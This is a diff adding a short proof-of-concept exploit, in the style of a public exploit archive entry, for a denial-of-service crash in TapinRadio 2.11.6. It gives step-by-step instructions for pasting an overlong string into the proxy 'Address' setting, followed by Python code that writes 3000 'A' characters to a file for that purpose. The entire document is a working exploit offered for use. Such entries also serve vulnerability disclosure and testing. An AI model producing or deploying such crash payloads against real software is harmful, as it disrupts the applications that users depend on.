@@ -1,0 +1,23 @@
+#Exploit Title: TapinRadio 2.11.6 - 'Address' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-21
+#Vendor Homepage: http://www.raimersoft.com/
+#Software Link: www.raimersoft.com/downloads/tapinradio_setup_x64.exe
+#Tested Version: 2.11.6
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: tapinadio_address.py
+#2.- Open tapin_add.txt and copy content to clipboard
+#3.- Open TapinRadio
+#4.- Select "Settings" > "Preferences" > "Miscellaneous"
+#5.- Select "Set Application Proxy..."" In "Address" field paste Clipboard
+#6.- In Port type "444" > "Username" type "test" > Password type "1234"
+#7.- Select "OK" and "OK"
+#8.- Crashed
+
+cod = "\x41" * 3000
+	
+f = open('tapin_add.txt', 'w')
+f.write(cod)
+f.close()
